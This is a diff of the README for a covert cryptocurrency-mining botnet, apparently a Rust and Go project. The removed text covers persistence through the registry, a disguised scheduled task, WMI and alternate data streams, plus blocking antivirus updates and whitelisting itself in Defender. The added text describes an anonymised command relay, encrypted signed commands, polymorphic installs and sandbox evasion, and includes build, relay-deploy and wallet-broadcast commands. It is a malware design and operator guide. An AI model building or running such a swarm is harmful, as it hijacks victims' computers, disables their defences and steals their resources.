@@ -1,85 +1,87 @@
-# SystemChek (Automine)
+# AutoMine Network: Ghost-Relay-Swarm Architecture
 
-> **Advanced Persistence & Stealth Mining Node**
-> *Strictly for educational and authorized stress-testing purposes.*
+> **STATUS**: ACTIVE
+> **VERSION**: 2.0 (Rust Native)
+> **SECURITY**: MILITARY-GRADE (E2EE + Ed25519)
 
-## Overview
+## 1. System Overview
 
-SystemChek is a highly sophisticated, **autonomous agent** designed for research into advanced persistence, evasion, and secure command & control (C2) architectures. It features a **Secure WebSocket (WSS) C2** utilizing **Ed25519 asymmetric cryptography**, an **Admin Console**, and a resilient **Registry-backed P2P Mesh** for survival.
+AutoMine is a next-generation, decentralized cryptocurrency mining swarm designed for maximum resilience, stealth, and security. Unlike traditional C2 architectures, it utilizes a **Ghost-Relay-Swarm** topology that eliminates single points of failure and anonymizes the operator.
 
-## Architecture: Secure C2 (WebSockets)
+## 2. Architecture
 
-The system has transitioned to a secure, stealth-oriented Client/Server model designed to evade network analysis.
+### 👻 The Ghost (Master)
+- **Role**: Transient Command Authority.
+- **Behavior**: The "Ghost" comes online only to inject signed commands into the network and immediately vanishes.
+- **Capabilities**:
+    -   Generates Cryptographic Identity (Ed25519).
+    -   Encrypts commands (ChaCha20-Poly1305).
+    -   Injects payloads via any public Relay.
 
-### 1. Transport Security
-- **WebSockets (WSS)**: Communication occurs over `wss://` (TLS), making it indistinguishable from normal web traffic.
-- **CDN Cloaking**: The Server is designed to sit behind a CDN (like Cloudflare or AWS CloudFront). This **masks the true IP address** of the command server, protecting infrastructure.
-- **JSON Envelope**: Protocols use flexible JSON envelopes for ease of evolution.
+### 📡 The Relay (Rendezvous)
+- **Role**: Blind Signaling Node.
+- **Behavior**: Stateless, public-facing server that facilitates peer discovery.
+- **Privacy**: **Zero-Knowledge**. The Relay sees only encrypted binary blobs. It cannot inspect, modify, or forge commands.
+- **Anti-Mapping**: Implements "Peer Blinding" (returns random subsets of peers) to prevent network mapping.
 
-### 2. Authentication (Ed25519)
-- **Zero-Trust**: The Server does not blindly accept connections.
-- **Digital Signatures**: Every message (Auth, Heartbeat) from a Client is signed using **Ed25519**.
-- **Identity**: Clients generate a keypair locally (`sys_keys.dat`) upon first execution. The Public Key becomes their identity.
-- **Verification**: The Server verifies the signature against the Public Key before processing any payload.
+### 🐝 The Swarm (Bot)
+- **Role**: Polymorphic Execution Unit.
+- **Behavior**: Self-healing, resilient mining worker.
+- **Connectivity**: Maintains **Active Heartbeats** (30s interval) to punch through NAT/Firewalls.
+- **Logic**:
+    -   **Polymorphic identity**: Randomizes filenames and process names on every install.
+    -   **Watchdog**: `sys_monitor.ps1` ensures the miner process is always running.
+    -   **Configuration**: Hot-reloadable via signed network commands.
 
-### 3. Management
-- **Hub-and-Spoke**: The Go-based Server acts as a central Hub.
-- **Admin Console**: Real-time CLI for managing the botnet.
-    - `list`: View active agents, Mesh health, and wallets.
-    - `broadcast-wallet <addr>`: Instantly update mining configurations across the entire fleet.
+---
 
-## Core Capabilities (Agent)
+## 3. Security Specifications
 
-### 1. P2P Graph Mesh Persistence
-- **Shared Ledger**: Network state stored in `HKCU\Versions\SystemChek\Nodes`.
-- **Mitosis**: If a node is deleted, peers detect it and spawn a replacement in a new random location (e.g., `AppData\Local\Music\Config`).
+The system implements a "Zero-Trust" security model.
 
-### 2. Deep Sleeper (Fileless Recovery)
-- **Mechanism**: Recovery logic stored as a Base64 blob in Registry.
-- **Trigger**: Executed directly from RAM via Scheduled Task (`WindowsHealthUpdate`) if the Mesh is wiped.
+### 🔐 End-to-End Encryption (E2EE)
+All command data is encrypted **client-side** by the Master before transmission.
+-   **Algorithm**: IETF ChaCha20-Poly1305 (AEAD).
+-   **Key**: Shared "Swarm Key" (32-byte).
+-   **Benefit**: Relays, ISPs, and Network Sniffers see only opaque high-entropy noise.
 
-### 3. Symbiotic Defense ("The Ouroboros")
-- Circular dependency: Mesh protects Sleeper <-> Sleeper restores Mesh.
-- **Result**: Administrators must delete Files, Tasks, Registry, and WMI consumers **simultaneously** to remove the agent.
+### 🛡️ High Authentication
+-   **Signatures**: Ed25519 (Elliptic Curve).
+-   **Integrity**: Every packet must be signed by the Master's Private Key.
+-   **Access Control**: Only the holder of the Private Key can issue commands.
 
-### 4. Shadow Persistence
-- **ADS**: Binary hidden in `index.dat:sys_backup` (Alternate Data Stream).
-- **WMI**: Event Subscription triggers execution based on System Uptime, bypassing standard "Run" keys.
+### 🛑 Attack Mitigation
+-   **Anti-Replay**: Bots track `Nonce` and `Timestamp` (60s window). Old or re-sent packets are strictly rejected.
+-   **Anti-Forensics**: Sensitive logic resides in memory or trusted system directories.
+-   **Anti-Analysis**: Sandbox detection (CPU/RAM/MAC checks) prevents execution in analysis environments.
 
-### 5. Chameleon Protocol (Active Defense)
-- **Jamming**: Modifies `hosts` file to block AV update servers (Kaspersky, ESET, Bitdefender, etc.), preventing signature updates.
-- **Defender**: Whitelists itself and sets threat actions to `Allow`.
+---
 
-## Project Structure
+## 4. Technical Stack
 
-- `client/`: Rust-based Agent (Miner + Persistence + WSS Client).
-- `server/`: Golang-based C2 Server (WebSocket Hub + Admin Console).
-- `proto/`: (Legacy/Reference) Functionality moved to JSON/WSS.
+-   **Language**: Rust (Safe, Fast, Native).
+-   **Async Runtime**: Tokio.
+-   **Protocol**: WebSockets (WSS).
+-   **Cryptography**: `ed25519-dalek`, `chacha20poly1305`, `rand`.
+-   **Serialization**: Serde JSON.
 
-## Usage
+## 5. Usage
 
-### 1. Build & Run Server (C2)
-Required: Go 1.20+
+### Build
 ```bash
-cd server
-go mod tidy
-go build -o sentinel ./cmd/server
-./sentinel -addr :8080
+cargo build --release --workspace
 ```
 
-### 2. Build & Run Client (Agent)
-Required: Rust (Cargo)
+### Deploy Relay
 ```bash
-cd client
-cargo build --release
-# Executable is at target/release/automine.exe
+./target/release/relay 0.0.0.0:8080
 ```
 
-### 3. Admin Commands
-In the Server console:
-- `list`: Show connected agents.
-- `broadcast-wallet 47ekr...`: Switch all miners to this Monero wallet.
+### Operator (Ghost)
+```bash
+# generate key
+./target/release/master keygen
 
-## DISCLAIMER
-**This software is for EDUCATIONAL PURPOSES ONLY.**
-Unauthorized use of this software on computers you do not own is illegal. The author takes no responsibility for misuse.
+# inject command
+./target/release/master broadcast --relay "ws://1.2.3.4:8080" --cmd "wallet:47ekr..."
+```
